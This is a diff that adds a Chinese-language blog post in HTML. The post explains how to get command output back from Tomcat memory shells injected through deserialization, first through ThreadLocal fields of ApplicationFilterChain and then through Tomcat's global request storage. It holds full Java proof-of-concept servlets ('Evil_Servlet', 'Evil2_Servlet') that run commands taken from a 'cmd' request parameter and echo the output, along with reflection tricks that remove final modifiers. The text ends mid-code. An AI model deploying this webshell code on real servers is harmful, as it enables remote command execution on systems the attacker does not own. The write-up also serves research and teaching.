@@ -1,0 +1,987 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<meta name="generator" content="Gridea Pro 0.0.0-dev">
+<title>内存马回显以及反序列化注入 | Bloyet&#39;s blog</title>
+<link rel="shortcut icon" href="/favicon.ico?v=1789062689">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="/styles/main.css">
+<link rel="alternate" type="application/rss+xml" title="内存马回显以及反序列化注入 | Bloyet&#39;s blog - RSS Feed" href="/feed.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <meta name="description" content="像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用 随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了 String cmd = request.getParameter(&amp;quot;cmd&amp;quot;); response.setContentType(&amp;quot;text/ht...">
+<link rel="canonical" href="https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"内存马回显以及反序列化注入","url":"https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/","description":"像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用 随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了 String cmd = request.getParameter(\u0026quot;cmd\u0026quot;); response.setContentType(\u0026quot;text/ht...","datePublished":"2025-09-04T01:30:47+08:00","dateModified":"2026-09-11T01:50:57+08:00","author":{"@type":"Person","name":"Bloyet's blog"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"Bloyet's blog"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://bloyet.github.io","name":"Bloyet's blog","position":1},{"@type":"ListItem","item":"https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/","name":"内存马回显以及反序列化注入","position":2}]}</script>
+<meta property="og:title" content="内存马回显以及反序列化注入">
+<meta property="og:description" content="像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用 随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了 String cmd = request.getParameter(&amp;quot;cmd&amp;quot;); response.setContentType(&amp;quot;text/ht...">
+<meta property="og:url" content="https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="Bloyet's blog">
+<meta property="og:image" content="/images/avatar.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/">
+<meta name="twitter:title" content="内存马回显以及反序列化注入">
+<meta name="twitter:description" content="像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用 随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了 String cmd = request.getParameter(&amp;quot;cmd&amp;quot;); response.setContentType(&amp;quot;text/ht...">
+<meta name="twitter:image" content="/images/avatar.png">
+</head>
+  <body class="page-post">
+    <div class="main">
+      <div class="main-content">
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              内存马回显以及反序列化注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-09-04
+              </span>
+              <span>
+                78 分钟阅读
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <p>像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用</p>
+<p>随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了</p>
+<pre><code class="language-java">String cmd = request.getParameter(&quot;cmd&quot;);
+response.setContentType(&quot;text/html; charset=UTF-8&quot;);
+PrintWriter writer = response.getWriter();
+if (cmd != null) {
+    try {
+        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+
+        //将命令执行结果写入扫描器并读取所有输入
+        Scanner scanner = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+        String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+        scanner.close();
+        writer.write(result);
+        writer.flush();
+        writer.close();
+    } catch (IOException e) {
+        e.printStackTrace();
+    } catch (NullPointerException n) {
+        n.printStackTrace();
+    }
+}
+
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012949956_00054.png" alt="" /></p>
+<p>问题是 打内存马 大多数是通过反序列化来打的，就没有这样直接的request的对象使用了</p>
+<p>有大佬提供的思路：</p>
+<h1 id="font-stylecolorrgb36-41-46threadlocal-response-font"><font style="color:rgb(36, 41, 46);">ThreadLocal Response 回显</font></h1>
+<h2 id="threadlocal-">ThreadLocal 是什么</h2>
+<p>ThreadLocal 是 Java 中的一个工具类，位于 java.lang 包中，主要用于为每个线程提供独立的变量副本。简单来说，就是每个线程通过 ThreadLocal 访问到的是属于自己线程的独立副本，而不是共享的一个对象。</p>
+<p>思路来自于@kingkk师傅</p>
+<p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象。这样才能获取到当前线程的相关信息。最终我们能够在org.apache.catalina.core.ApplicationFilterChain类中找到这样两个变量lastServicedRequest和lastServicedResponse。并且这两个属性还是静态的，我们获取时无需实例化对象。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012951938_00055.png" alt="" /></p>
+<p>在internalDoFilter方法中，经过if语句 之后先回进行一个判断，然后把<font style="color:rgb(36, 41, 46);">response 以及 request 取出来</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012953592_00056.png" alt="" /></p>
+<p>整理一下思路：</p>
+<p>我们需要反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为**<font style="color:#DF2A3F;">true</font>**</p>
+<p><font style="color:rgb(36, 41, 46);">response 以及 request 取出来是在其中责任链实现逻辑中 internalDofilter 的部分，当我们从filterCofigs 中读取完所有的 filterConfig 配置，并且走完它们的所有逻辑之后发生的（逻辑是doFilter()-&gt;internalDoFilter()-&gt;调用doFilter链-&gt;调用set方法，把response 以及 request 取出来-&gt;service()方法，这也是</font><strong><font style="color:#DF2A3F;">局限性</font></strong><font style="color:rgb(36, 41, 46);">所在了），而我们注入命令执行的位置其实是在service()中然后调用到doget方法中，第一次在我们设置为true的时候（默认是false的），也是不会有回显的，因为此时还没获取到request（是已经判断完之后，才在service中修改为true的）。</font></p>
+<p><font style="color:rgb(36, 41, 46);">所以我们的逻辑应该是第一次让它判断条件变成true，然后在第二次请求的时候就可以获取到request，然后通过判断 ApplicationDispatcher.WRAP_SAME_OBJECT是否为</font><strong><font style="color:#DF2A3F;">true </font></strong>，如果不为true，我们就反射字段，设置为true以及把变量进行**<font style="color:#DF2A3F;">初始化</font>**，然后如果为true了，说明之前已经进行过获取request对象了，然后在走命令执行回显的逻辑</p>
+<p>反射的知识点，我们通过反射只能拿到类似于一个这个类型的变量，并不是它的真实值（作者的自我补充知识点）</p>
+<p>还有一个点就是为什么要对lastServicedRequest和lastServicedResponse这两个变量进行初始化，其实是因为在Tomcat初始化的时候会把他们的值设置为null，所以我们需要反射设置为new ThreadLocal<ServletRequest>()，然后被set了request，然后我们在get取出来就得到了我们需要的值了，如果没有设置值，就会出现空指针异常</p>
+<p>而且<code>lastServicedRequest</code>和<code>lastServicedResponse</code>,以及 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>变量都是final 修饰，也就是不可修改的定值，这对于我们反序列化打入内存马非常不利，所以我们还需要通过反射修改其 final 属性</p>
+<p><font style="color:rgb(36, 41, 46);">上述利用存在两个个利用条件：</font><br />
+<font style="color:rgb(36, 41, 46);">一是 JDK 在 17 版本之后不能够通过反射去修改 final 属性值。也就是在 Springboot3 或者 Spring6 这种内置要求 JDK17 版本之后的服务都不能通过这种方式打入内存马</font><br />
+<font style="color:rgb(36, 41, 46);">二是 tomcat10.1.x 之后的版本（也就是 Springboot3 要求的版本），判断条件也发生了变化</font><br />
+<img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012955514_00057.png" alt="" /><br />
+<font style="color:rgb(36, 41, 46);">所以利用场景限制于 Tomcat&lt;10 ，JDK&lt;17 的情况，具体一点就是 Springboot2，spring5，以及版本符合条件的 javaweb 环境等</font></p>
+<p>整理完一些小细节和思路，就直接上POC了：</p>
+<p>里面细节很多 第一次写 也是有点难度的 java基础还是没打牢，参考大佬poc吧</p>
+<pre><code class="language-java">package Filter;
+
+import org.apache.catalina.core.ApplicationFilterChain;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebFilter;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.swing.plaf.synth.SynthRadioButtonMenuItemUI;
+import java.io.FileDescriptor;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.Scanner;
+
+@WebServlet(&quot;/evil&quot;)
+public class Evil_Servlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        try{
+            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
+            Field WRAP_SOME_OBJECT_FIELD=Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequestfield=ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);
+            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
+            lastServicedRequestfield.setAccessible(true);
+            lastServicedResponsefield.setAccessible(true);
+            //使用modifiersField修改属性值的final修饰
+            //每一个Field都会存在一个变量 modifiers用来描述修饰词，所以这里我们获取到的是Field的modifiers 它本质上是一个int类型的值
+            java.lang.reflect.Field  modifiersfield= Field.class.getDeclaredField(&quot;modifiers&quot;);
+            modifiersfield.setAccessible(true);
+
+            //修改WRAP_SOME_OBJECT_FIELD以及requst和response的modifiers，值的话由于要得到16进制位数，并且清除final属性，本质上就是将他修改为0x0000即可，这里getModifiers()的结果为0x0010 Modifier.FINAL的结果也是0x0010，所以两者&amp;~运算得到0x0000
+            modifiersfield.setInt(WRAP_SOME_OBJECT_FIELD,WRAP_SOME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);
+            modifiersfield.setInt(lastServicedRequestfield,lastServicedRequestfield.getModifiers() &amp; ~Modifier.FINAL);
+            modifiersfield.setInt(lastServicedResponsefield,lastServicedResponsefield.getModifiers() &amp; ~Modifier.FINAL);
+
+
+            //如果是第一次访问，WRAP_SOME_OBJECT_FIELD肯定是没有值的，所以我们赋值上true 并且同时给lastServicedRequest和lastServicedResponse都初始化
+            if(!WRAP_SOME_OBJECT_FIELD.getBoolean(null)){
+                WRAP_SOME_OBJECT_FIELD.setBoolean(null,true);
+                lastServicedResponsefield.set(null,new ThreadLocal&lt;ServletResponse&gt;());
+                lastServicedRequestfield.set(null,new ThreadLocal&lt;ServletRequest&gt;());
+
+            }else{//第二次访问开始正式获取当前线程下的Req和Resp
+                ThreadLocal&lt;ServletRequest&gt; threadLocalReq= (ThreadLocal&lt;ServletRequest&gt;)lastServicedRequestfield.get(null);
+                ThreadLocal&lt;ServletResponse&gt; threadLocalResp=(ThreadLocal&lt;ServletResponse&gt;) lastServicedResponsefield.get(null);
+                ServletRequest servletRequest = threadLocalReq.get();
+                ServletResponse servletResponse = threadLocalResp.get();
+
+                String cmd = servletRequest.getParameter(&quot;cmd&quot;);
+                servletResponse.setContentType(&quot;text/html; charset=UTF-8&quot;);
+                PrintWriter writer = servletResponse.getWriter();
+                if (cmd != null) {
+                    try {
+                        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+
+                        //将命令执行结果写入扫描器并读取所有输入
+                        Scanner scanner = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+                        String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+                        scanner.close();
+                        writer.write(result);
+                        writer.flush();
+                        writer.close();
+                    } catch (IOException e) {
+                        e.printStackTrace();
+                    } catch (NullPointerException n) {
+                        n.printStackTrace();
+                    }
+                }
+
+                System.out.println(req);
+                System.out.println(servletRequest);
+            }
+
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+
+    }
+
+}
+</code></pre>
+<h2 id="heading">局限性</h2>
+<p>例如在我们打shiro这种反序列化的时候，通过这种方法是获取不到回显的，在上文我其实已经讲的很清楚了，shiro其实是一个自定义的filter，它会在这里走完所有的逻辑，所以就算我们把下面的条件设置为true了，我们在它赋值前也是拿不到request的</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012956974_00058.png" alt="" /></p>
+<h1 id="font-stylecolorrgb36-41-46-responsefont"><font style="color:rgb(36, 41, 46);">全局存储 Response</font></h1>
+<p>我们经过上文的分析，如果是ThreadLocal类来获取回显的方式，限制还是比较多的，例如shiro这种就不适用，那我们能不能换个思路，去找到Tomcat全局存储的request和response呢？而且这个request必须还是当前进程的，所以我们必须找到一个和当前代码的上下文和Tomcat全局存储的关系</p>
+<p>AbstractProcessor类中我们可以找到了全局存储Response</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012958805_00059.png" alt="" /></p>
+<p>我们先看调用栈（注意这里调试的时候 你的maven依赖中的Tomcat版本和tomcat服务器运行的版本需要一致，不然调试的时候，就会出现字节码与源码不一致导致调试很难受）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013000627_00060.png" alt="" /></p>
+<p>可以看到Http11Processor 是第一个与AbstractProcessor类产生交集的 我们去分析一下这个类（点一下这个调用栈就来到了Http11Processor#service方法中）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947845_00052.png" alt="" /></p>
+<p>我们发现这个request是从AbstractProcessor类中继承过来的，那就从原来的AbstractProcessor类到现在的Http11Processor类 都是有机会获取到request了。观察调用栈其实没有直接对于AbstractProcessor 的引用，那么我们通过去看Http11Processor类 会好很多</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013037418_00080.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013038863_00081.png" alt="" /></p>
+<p>要获取到Http11Processor类 那么我们得先看看它的创建过程</p>
+<p>往上调用一帧，发现是调用的service 也就是Http11Processor#service，这里明显不是创建，继续往上调用一帧</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013035308_00079.png" alt="" /></p>
+<p>可以看到processor被赋值成了Http11Processor对象</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013041267_00082.png" alt="" /></p>
+<p>其中一共有三个if语句。分别是：</p>
+<p>第一个 if 尝试根据协商的协议获取一个合适的处理器。</p>
+<p>第二个 if 在没有找到合适的处理器时，尝试从回收池中获取一个。</p>
+<p>第三个 if 如果回收池中没有处理器，则创建一个新的处理器并注册。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013042815_00083.png" alt="" /></p>
+<p>在第三个if中调用createProcessor方法来创建它，但是现在还是没办法获取到它，接着往下看</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947883_00053.png" alt="" /></p>
+<p>在register方法中：</p>
+<p>获取processor中的request信息，存储为RequestInfo，然后调用set方法，把信息存储在global中</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013017438_00069.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013019009_00070.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013015844_00068.png" alt="" /></p>
+<p>那么就继续拓展，只要可以获取到ConnectionHandler 的 global 属性就可以获得request</p>
+<p>我们找到ConnectionHandler的创建，发现它在实例化的时候 ，会将整个值调用set方法，赋值给AbstractProtocol中的handler变量，那么如果我们找到了AbstractProtocol的实例，那么就可以直接反射调用get方法来获取到ConnectionHandler，从而获取到global了</p>
+<p>不同版本的源码不太一样，不影响</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013031764_00077.png" alt="" /></p>
+<p>还有一个版本是（意思都是一样的）：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013029783_00076.png" alt="" /></p>
+<p>那我们怎么样才能获取到AbstractProtocol的实例呢？</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013034269_00078.png" alt="" /></p>
+<p>只要获取到下面任意子类就可以获取到AbstractProtocol的实例了</p>
+<p>注意 我们现在好好梳理一下逻辑：</p>
+<p>为什么不直接反射获取，因为在反射的时候，获取到的只是类似于一个指针，并不是直接获得这个类的实例，例如反射获取到了一个类，还需要传入这个类的实例才能准确的改变这个类的值，而此时我们需要改变特定的值 or 获取到特定类的值，直接反射是拿不到这个值的，所以现在写这么多，也都是因为这个原因，我们需要找到一个可以Tomcat创建的实例，而这个实例是可以被我们获取到的，而不是我们自己创建的，这样才是我们想要的request</p>
+<p>我们来看下 Tomcat 请求处理流程</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012947805_00050.png" alt="" /></p>
+<p>这个说的很好，就直接复制过来了（稍微加点解释）：</p>
+<p>CoyoteAdapter 作为 Tomcat 中 Connector （ <strong>负责网络处理</strong>）和 Container（ <strong>负责处理请求</strong> ） 的连接桥梁，本身肯定是会内置 Connector 的具体实现对象的，而 Connector 中的内容我们又可以划分为 ProtocolHandler 和 Adapter 两类，这里的 Adapter 就是CoyoteAdapter了。至于 ProtocolHandler，如果是正常的 Http/1.1 的请求，内置的具体实现就是 Http11NioProtocol。<br />
+所以只要我们发送了一次 Http 请求，就能够通过 Connector 获取到 Http11NioProtocol。现在问题是如何获取到 Connctor？还是按照 Tomcat 的架构来，一个大的 server 具体是由每一个小的 service 去实现的，而一个 service 中又由 connector 和 container 组成。就可以考虑通过 service 去获取 connector。<br />
+实际上就是获取 StandardService 的 connectors 内置属性,而 StandardSercvice 在执行 addconnector 方法的时候，最终将所有的 connector 都存进了 connectors 属性中（所以我们还要遍历它）</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013004105_00062.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013006110_00063.png" alt="" /></p>
+<p>那么我们要怎么获取到StandardSercvice？<br />
+那就不得不提到Tomcat的类加载机制了：</p>
+<p>Tomcat使用的并不是传统的类加载机制，我们来看下面的例子：</p>
+<p>我们知道，Tomcat中的一个个Webapp就是一个个Web应用，如果WebAPP A依赖了common-collection 3.1，而WebApp B依赖了common-collection 3.2。这样在加载的时候由于全限定名相同，因此不能同时加载，所以必须对各个Webapp进行隔离，如果使用双亲委派机制，那么在加载一个类的时候会先去他的父加载器加载，这样就无法实现隔离。</p>
+<p>Tomcat隔离的实现方式是每个WebApp用一个独有的ClassLoader实例来优先处理加载，并不会传递给父加载器。这个定制的ClassLoader就是**<font style="color:#DF2A3F;">WebappClassLoader</font>**。那么我们又如何将原有的父加载器和WebappClassLoader联系起来呢？</p>
+<p><strong><font style="color:#DF2A3F;">这里Tomcat使用的机制是线程上下文类加载器Thread ContextClassLoader。Thread类中有getContextClassLoader()和setContextClassLoader(ClassLoader cl)方法用来获取和设置上下文类加载器。</font></strong>（所以我们可以通过线程来获得ClassLoader，也就是**<font style="color:#DF2A3F;">WebappClassLoader</font>**）</p>
+<p>如果没有setContextClassLoader(ClassLoader cl)方法通过设置类加载器，那么线程将继承父线程的上下文类加载器，如果在应用程序的全局范围内都没有设置的话，那么这个上下文类加载器默认就是应用程序类加载器。</p>
+<p>对于Tomcat来说ContextClassLoader被设置为WebAppClassLoader（在一些框架中可能是继承了public abstract WebappClassLoaderBase的其他Loader)。因此WebappClassLoaderBase（这个是WebappClassLoader的父类）就是我们寻找的Thread和Tomcat 运行上下文的联系之一</p>
+<p>具体怎么联系的就看代码</p>
+<p>WebappClassLoaderBase#方法</p>
+<p>获取到WebResourceRoot</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013008084_00064.png" alt="" /></p>
+<p>然后在WebResourceRoot类-&gt;实现类StandardRoot中：</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013010266_00065.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013012165_00066.png" alt="" /></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013013373_00067.png" alt="" /></p>
+<p>这个context其实就是StandardContext：</p>
+<p>这个是没有直接获取属性的方法的 需要通过反射来进行获取<br />
+<img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013002257_00061.png" alt="" /></p>
+<p>ApplicationContext：</p>
+<p>其中的Service中的具体实现类就是 StandardService  而且这里注意的是 这里也没有直接获取到service的方法 就通过反射来获取</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013020338_00071.png" alt="" /></p>
+<p>那么到这里就如愿以偿的获得到了StandardService</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013026232_00074.png" alt="" /></p>
+<h2 id="heading-1">思路梳理</h2>
+<p>我们先是通过线程来获取到WebappClassLoader 然后通过它的父类WebappClassLoaderBase获取到WebResourceRoot接口的standardRoot实现类 -&gt;StandardContext-&gt;ApplicationContext-&gt;StandardService</p>
+<p>然后在StandardService中的connectors 属性存放了Http11NioProtocol的属性 通过Http11NioProtocol类就可以获得父类AbstractProtocol 就可以获取到ConnectionHandler-&gt;global 从而获取到request和response</p>
+<p>下面就来写个poc：</p>
+<p>也就是后面一点点是没有提到的 所以大部分还是很容易写的</p>
+<pre><code class="language-java">package Servlet;
+
+
+import org.apache.catalina.Context;
+import org.apache.catalina.WebResourceRoot;
+import org.apache.catalina.connector.Connector;
+import org.apache.catalina.core.ApplicationContext;
+import org.apache.catalina.core.StandardService;
+import org.apache.catalina.loader.WebappClassLoaderBase;
+import org.apache.coyote.ProtocolHandler;
+import org.apache.coyote.RequestGroupInfo;
+import org.apache.coyote.RequestInfo;
+
+import javax.servlet.ServletException;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.util.List;
+import java.util.Scanner;
+
+@WebServlet(&quot;/evil2&quot;)
+public class Evil2_Servlet  extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse response) throws ServletException, IOException {
+
+        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
+       
+        // WebResourceRoot resourceRoot = webappClassLoaderBase.getResources();
+        //通过反射获取是最稳妥的
+        Field webappclassLoaderBaseField=Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;).getDeclaredField(&quot;resources&quot;);
+        webappclassLoaderBaseField.setAccessible(true);
+        WebResourceRoot resourceRoot=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
+
+        Context standardContext = resourceRoot.getContext();
+
+        try {
+            //获取ApplicationContext
+            Field application = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;).getDeclaredField(&quot;context&quot;);
+            application.setAccessible(true);
+            ApplicationContext applicationContext = (ApplicationContext) application.get(standardContext);
+
+            //获取StandardService
+            Field Standard = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;).getDeclaredField(&quot;service&quot;);
+            Standard.setAccessible(true);
+            StandardService standardService = (StandardService) Standard.get(applicationContext);
+
+            //获取connectors
+            Field connectorfield = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;).getDeclaredField(&quot;connectors&quot;);
+            connectorfield.setAccessible(true);
+            Connector[] connectors = (Connector[]) connectorfield.get(standardService);
+            Connector connector = connectors[0];
+
+            //获取到Http11NioProtocol ,通过Http11NioProtocol 获取到父类AbstractProtocol的属性
+            ProtocolHandler protocolHandler = connector.getProtocolHandler();
+            //反射获取ConnectionHandler
+            Field Connection_Handler =Class.forName(&quot;org.apache.coyote.AbstractProtocol&quot;).getDeclaredField(&quot;handler&quot;);
+            Connection_Handler.setAccessible(true);
+            org.apache.tomcat.util.net.AbstractEndpoint.Handler  ConnectionHandler= (org.apache.tomcat.util.net.AbstractEndpoint.Handler) Connection_Handler.get(protocolHandler);
+
+            //获取global
+            Field global_field = Class.forName(&quot;org.apache.coyote.AbstractProtocol$ConnectionHandler&quot;).getDeclaredField(&quot;global&quot;);
+            global_field.setAccessible(true);
+            RequestGroupInfo global = (RequestGroupInfo) global_field.get(ConnectionHandler);
+
+            //获取processors
+            Field processorsField = Class.forName(&quot;org.apache.coyote.RequestGroupInfo&quot;).getDeclaredField(&quot;processors&quot;);
+            processorsField.setAccessible(true);
+            List&lt;RequestInfo&gt; requestInfoList = (List&lt;RequestInfo&gt;) processorsField.get(global);
+
+            //获取request
+            Field requestField = Class.forName(&quot;org.apache.coyote.RequestInfo&quot;).getDeclaredField(&quot;req&quot;);
+            requestField.setAccessible(true);
+            for(RequestInfo requestInfo : requestInfoList) {
+                org.apache.coyote.Request request = (org.apache.coyote.Request) requestField.get(requestInfo);
+
+                //通过org.apache.coyote.Request的Notes属性获取继承HttpServletRequest的org.apache.catalina.connector.Request
+                org.apache.catalina.connector.Request http_request = (org.apache.catalina.connector.Request) request.getNote(1);
+                org.apache.catalina.connector.Response http_response = http_request.getResponse();
+
+                PrintWriter writer = http_response.getWriter();
+                String cmd = http_request.getParameter(&quot;cmd&quot;);
+
+                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
+                Scanner scanner = new Scanner(inputStream).useDelimiter(&quot;\\A&quot;);
+                String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+                scanner.close();
+                writer.write(result);
+                writer.flush();
+                writer.close();
+            }
+
+
+        } catch (Exception e) {
+            System.out.println(e.getMessage());
+        }
+
+
+        
+    }
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911013027703_00075.png" alt="" /></p>
+<p>注意点：</p>
+<p><font style="color:rgb(36, 41, 46);">WebappclassLoader 的 </font><strong><font style="color:#DF2A3F;">getResources()</font></strong><font style="color:rgb(36, 41, 46);">方法，早在 8.5.78 的版本就被标价为了</font><code>&lt;font style=&quot;color:rgb(128, 128, 128);&quot;&gt;@Deprecated&lt;/font&gt;</code><font style="color:rgb(36, 41, 46);">，直接就 return null 了，然后在 10.x 版本就直接移除了该方法  所以我们进行反射获取是最稳妥的办法</font></p>
+<p>同时还有个情况，就是在某个项目环境中没有Tomcat依赖，是通过idea去进行非内嵌的形式挂载的Tomcat，这个时候我们项目中没有Tomcat的依赖，就必须全部通过反射的形式去获取：</p>
+<p>核心获取req代码：</p>
+<pre><code class="language-java">// 获取当前线程的 ClassLoader
+Class&lt;?&gt; webappClassLoaderBaseClass = Class.forName(&quot;org.apache.catalina.loader.WebappClassLoaderBase&quot;);
+Object webappClassLoaderBase = Thread.currentThread().getContextClassLoader();
+
+// 获取 WebResourceRoot
+Field resourcesField = webappClassLoaderBaseClass.getDeclaredField(&quot;resources&quot;);
+resourcesField.setAccessible(true);
+Object resourceRoot = resourcesField.get(webappClassLoaderBase);
+
+// 获取 Context
+Class&lt;?&gt; webResourceRootClass = Class.forName(&quot;org.apache.catalina.WebResourceRoot&quot;);
+Object standardContext = webResourceRootClass.getMethod(&quot;getContext&quot;).invoke(resourceRoot);
+
+// 获取 ApplicationContext
+Class&lt;?&gt; standardContextClass = Class.forName(&quot;org.apache.catalina.core.StandardContext&quot;);
+Field appField = standardContextClass.getDeclaredField(&quot;context&quot;);
+appField.setAccessible(true);
+Object applicationContext = appField.get(standardContext);
+
+// 获取 StandardService
+Class&lt;?&gt; applicationContextClass = Class.forName(&quot;org.apache.catalina.core.ApplicationContext&quot;);
+Field serviceField = applicationContextClass.getDeclaredField(&quot;service&quot;);
+serviceField.setAccessible(true);
+Object standardService = serviceField.get(applicationContext);
+
+// 获取 Connector[]
+Class&lt;?&gt; standardServiceClass = Class.forName(&quot;org.apache.catalina.core.StandardService&quot;);
+Field connectorsField = standardServiceClass.getDeclaredField(&quot;connectors&quot;);
+connectorsField.setAccessible(true);
+Object[] connectors = (Object[]) connectorsField.get(standardService);
+Object connector = connectors[0];
+
+// 获取 ProtocolHandler
+Class&lt;?&gt; connectorClass = Class.forName(&quot;org.apache.catalina.connector.Connector&quot;);
+Object protocolHandler = connectorClass.getMethod(&quot;getProtocolHandler&quot;).invoke(connector);
+
+// 获取 ConnectionHandler
